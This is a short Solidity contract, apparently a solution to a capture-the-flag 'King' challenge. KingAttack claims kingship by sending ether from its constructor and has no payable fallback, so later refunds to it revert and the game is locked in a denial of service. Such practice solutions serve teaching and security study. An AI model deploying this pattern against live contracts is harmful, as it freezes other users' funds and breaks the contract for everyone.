// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingAttack {
    King king;

    constructor(address payable _kingContractAddress) public payable {
        king = King(_kingContractAddress);
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "King call failed");
    }
}
